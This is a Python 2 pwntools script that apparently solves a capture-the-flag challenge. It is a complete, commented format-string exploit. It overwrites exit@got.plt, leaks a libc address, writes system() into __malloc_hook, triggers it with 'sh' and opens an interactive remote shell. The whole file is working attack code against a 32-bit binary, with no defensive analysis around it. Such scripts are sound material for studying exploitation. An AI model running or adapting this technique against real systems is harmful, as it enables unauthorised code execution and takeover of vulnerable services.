#!/usr/bin/env python2
from pwn import *
import sys

HOST = 'challenge.pwny.racing'
PORT = 40013

LIBC = 0x065810
HOOK = 0x1d5788
SYST = 0x03cd10

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]


def put(addr, data):

	for i in range(0, len(data), 2):
		io.recvuntil(': ')
		loc = p32(addr + i)
		assert('\x00' not in loc), 'cannot have null bytes in the address'
		io.sendline(loc+'%'+str(u16(data[i:i+2]) - 4)+'c%7$hn___')
		io.recvuntil('___')


io = remote(HOST, PORT)
print io.recvuntil('5!\n')

# note: this exploit will use the regular __malloc_hook trigger for reliability
#       but the quicker options would be a one shot gadget on exit() as you can
#       control eax.
io.recvuntil(': ')

# step 1: write the address of main() to exit@got.plt to get unlimited writes
io.sendline(p32(0x0804b020)+'%'+str((0x080485eb & 0xffff) - 4)+'c%7$hn')

# step 2: leak libc
io.recvuntil(': ')
io.sendline(p32(0x0804b010)+'%7$s___')
leak = io.recvuntil('___')
leak = leak[4:8]
leak = u32(leak)
libc = leak - LIBC

log.info('leak: 0x%08x' % leak)
log.info('libc: 0x%08x' % libc)

# step 3: write "sh" to low memory so we can pass a param to __malloc_hook
put(0x0804b120, "sh")

# step 4: write system() to __malloc_hook()
put(libc+HOOK, p32(libc+SYST))

# step 5: trigger __malloc_hook by passing a length specifier above 65535,
#         in this case we will use the address of the "sh" string previously
#         planted in order to use it as a param (there is a 32 byte overhead).
io.recvuntil(': ')
io.sendline('%'+str(0x0804b100))

# step 6: collect the shell
io.sendline('id')
log.success('shell? %s' % io.recvline().strip())
io.interactive()

